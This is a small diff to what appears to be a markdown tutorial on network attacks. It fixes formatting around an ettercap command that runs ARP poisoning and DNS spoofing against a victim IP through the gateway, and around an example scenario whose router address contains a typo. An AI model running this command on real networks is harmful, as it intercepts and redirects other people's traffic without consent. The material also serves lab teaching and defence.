@@ -79,9 +79,8 @@ ping facebook.com
 # console: 
 ```bash
 ettercap -T -i your_interface_monitoring -M arp:remote -P dns_spoof /your_gateway_listener// /victim_IP//
-
+```
 
 Example scenario:
-
-If your interface is eth0, the router is `92.168.1.1`, and the victim is `192.168.1.50`
+- If your interface is eth0, the router is `92.168.1.1`, and the victim is `192.168.1.50`
 
